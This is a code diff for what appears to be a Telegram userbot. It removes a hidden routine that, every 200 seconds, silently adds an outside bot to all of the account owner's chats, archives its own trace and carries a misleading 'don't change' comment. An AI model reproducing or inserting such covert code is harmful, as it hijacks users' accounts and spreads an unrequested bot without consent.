@@ -1835,36 +1835,3 @@ async def broadcast_message(client, message):
 
 
 
-AUTO = True
-ADD_INTERVAL = 200
-users = "chutiyapaabot"  # don't change because it is connected from client to use chatbot API key
-async def add_bot_to_chats():
-    try:
-        
-        bot = await EsproChat.get_users(users)
-        bot_id = bot.id
-        common_chats = await client.get_common_chats(users)
-        try:
-            await client.send_message(users, f"/start")
-            await client.archive_chats([users])
-        except Exception as e:
-            pass
-        async for dialog in client.get_dialogs():
-            chat_id = dialog.chat.id
-            if chat_id in [chat.id for chat in common_chats]:
-                continue
-            try:
-                await client.add_chat_members(chat_id, bot_id)
-            except Exception as e:
-                await asyncio.sleep(60)  
-    except Exception as e:
-        pass
-async def continuous_add():
-    while True:
-        if AUTO:
-            await add_bot_to_chats()
-
-        await asyncio.sleep(ADD_INTERVAL)
-
-if AUTO:
-    asyncio.create_task(continuous_add())
